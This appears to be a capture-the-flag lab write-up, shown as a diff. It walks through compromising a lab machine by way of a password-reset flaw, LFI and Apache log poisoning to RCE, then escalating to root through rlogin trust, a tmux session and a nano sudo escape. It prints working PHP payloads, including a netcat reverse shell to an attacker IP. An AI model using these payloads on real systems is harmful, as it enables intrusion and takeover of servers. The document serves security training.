@@ -2,67 +2,278 @@
 
 ## 1. Enumeration
 
-### Nmap
+### Nmap Scan
 
-'''bash
+```bash
 sudo nmap -p- -sC -sV --min-rate 1000 10.129.3.115
-'''
-5 tcp port is open, one of them is http port
--> visit via browser and we can find admin login page.
+```
 
-### Web Enumeration
-there's "Forgot Password" link. that allow us to change password.
-try "user" as username, but username not found.
-try "admin" as username, we got the message means that we successfully changed the password!!
-using developer tool of browser, we found new_password in response body!
+**Explanation**
 
-on admin dashboard, we see the content of log file.
-by using burpsuite on admin dashboard, we see the parapeter "file" specifies what file is to be read.
-we already know the running service on the target is apache, by nmap output.
--> google search abount apache log file path
-Let's try to see log file /var/log/apache2/access.log, by specify the file parameter "file".
-Now, we can see the content of access.log, and HTTP header "User-Agent" is included in access.log
-->there is Local File Inclusion vulnerability on the target, and probably we can use Log Poisoning.
+- `-p-` scans all 65535 ports
+- `-sC` runs default NSE scripts
+- `-sV` detects service versions
+- `--min-rate 1000` speeds up the scan by sending packets faster
 
-Local File Inclusion (LFI) is a web vulnerability where an attacker manipulates input parameters to force an application to include files stored on the server
+The scan revealed **five open TCP ports**, including an HTTP service.
 
-Condition for Log Poisoning to RCE
-1. The application has a Local File Inclusion (LFI) vulnerability.
-2. The attacker can read a log file (e.g., Apache access.log) via LFI.
-3. User input (e.g., User-Agent) is written into the log file.
-4. The log file is included by the application using functions like include() so that PHP code is executed.
-
-we know 1,2,3 is met, so try 4.
-
+Accessing the web service in a browser revealed an **admin login page**.
 
 ---
 
-## 2. Initial Foothold
+## 2. Initial Access (User Flag)
 
-### Vulnerability Identification
+### Password Reset Function
 
-### Exploitation
+The application contains a **"Forgot Password"** feature that allows users to reset their password.
+
+Testing different usernames revealed the following behavior:
+
+- `user` → username not found  
+- `admin` → password reset successful  
+
+Using the browser's **Developer Tools**, the response body revealed a field containing the **new password**.
+
+After logging in as **admin**, the dashboard displayed the contents of a **log file**.
 
 ---
 
-## 3. User Flag
+### Identifying Local File Inclusion (LFI)
 
-### Post-Exploitation Enumeration
+Using Burp Suite, the request on the admin dashboard revealed a parameter:
 
-### Credential Discovery
+```
+file=
+```
 
-### Lateral Movement (if applicable)
+This parameter determines which file is displayed.
+
+From the earlier Nmap scan we already know the web server is **Apache**.
+
+Searching for the default Apache log location revealed:
+
+```
+/var/log/apache2/access.log
+```
+
+By setting the parameter to:
+
+```
+file=/var/log/apache2/access.log
+```
+
+the contents of the **access log** were displayed.
+
+This confirmed that the application was vulnerable to **Local File Inclusion (LFI)**.
+
+**Local File Inclusion (LFI)** is a vulnerability where an attacker manipulates input parameters to force an application to include files stored on the server.
 
 ---
 
-## 4. Privilege Escalation
+## Log Poisoning → Remote Code Execution
 
-### Privilege Check
+The Apache access log records request headers such as:
 
-### Vulnerability / Misconfiguration
+```
+User-Agent
+```
 
-### Exploitation
+Since we can both:
+
+- read the log file  
+- inject data into the log file  
+
+this suggests the possibility of **log poisoning**.
+
+### Conditions for Log Poisoning → RCE
+
+1. The application has a **Local File Inclusion (LFI)** vulnerability.
+2. The attacker can read a log file (e.g., Apache `access.log`) via LFI.
+3. User-controlled input (e.g., `User-Agent`) is written into the log file.
+4. The log file is included by the application in a way that executes PHP code.
+
+Conditions **1–3 were confirmed**, so the next step was to test condition **4**.
+
+---
+
+### Testing Code Execution
+
+A PHP payload was injected into the `User-Agent` header:
+
+```
+<?php system('id'); ?>
+```
+
+Request steps:
+
+1. Send request with malicious `User-Agent`
+2. Load the log file using LFI
+
+```
+file=/var/log/apache2/access.log
+```
+
+The response displayed the output of the `id` command, confirming **remote code execution**.
+
+---
+
+### Reverse Shell
+
+A reverse shell payload was injected into the log file:
+
+```
+<?php exec('busybox nc 10.10.15.56 1234 -e bash'); ?>
+```
+
+Start a listener on the attacker machine:
+
+```bash
+nc -nlvp 1234
+```
+
+**Explanation**
+
+- `-n` disables DNS resolution  
+- `-l` starts listening mode  
+- `-v` enables verbose output  
+- `-p` specifies the listening port  
+
+After including the poisoned log file again:
+
+```
+file=/var/log/apache2/access.log
+```
+
+a reverse shell connection was established.
+
+The **user flag** was found at:
+
+```
+/home/sadm/user.txt
+```
+
+---
+
+## 3. Privilege Escalation
+
+### Investigating rlogin Trust Relationship
+
+The file:
+
+```
+/etc/hosts.equiv
+```
+
+was discovered on the system.
+
+This file defines **trusted hosts** for remote login services such as `rlogin`.
+
+If a trusted host connects using `rlogin`, the system may allow login **without requiring a password**.
+
+The file revealed that the user **sadm** was trusted.
+
+---
+
+### Exploiting the Trust Relationship
+
+A local user named `sadm` was created on the attack machine.
+
+```bash
+sudo useradd sadm
+```
+
+Creates a new user.
+
+```bash
+sudo passwd sadm
+```
+
+Sets the user's password.
+
+Switch to the new user:
+
+```bash
+sudo su sadm
+```
+
+Then connect using:
+
+```bash
+rlogin 10.129.3.115
+```
+
+This successfully provided a shell as **sadm**.
+
+---
+
+### Discovering a Tmux Session
+
+Check running processes:
+
+```bash
+ps aux | grep sadm
+```
+
+**Explanation**
+
+- `ps aux` lists all running processes  
+- `grep sadm` filters processes related to the user `sadm`  
+
+The output showed an active **tmux session**.
+
+Tmux allows multiple terminal sessions within a single terminal.
+
+Attach to the existing session:
+
+```bash
+tmux attach -t sadm_session
+```
+
+This revealed the output of:
+
+```
+sudo -l
+```
+
+The user `sadm` could run:
+
+```
+sudo nano /etc/firewall.sh
+```
+
+---
+
+### Exploiting Nano
+
+Open the file:
+
+```bash
+sudo nano /etc/firewall.sh
+```
+
+Inside **nano**, pressing:
+
+```
+CTRL + R
+CTRL + X
+```
+
+opens the **execute command** prompt.
+
+From there, a command can be executed as root:
+
+```
+cat /root/root*.txt
+```
+
+Root flag obtained.
 
 ---
 
 ## What We Learned
+
+- How **Local File Inclusion (LFI)** can lead to **Remote Code Execution**
+- How **log poisoning** works through web server logs
+- How to exploit **trusted host relationships** in `/etc/hosts.equiv`
+- How exposed **tmux sessions** can lead to privilege escalation
+- How to execute commands from within **nano**
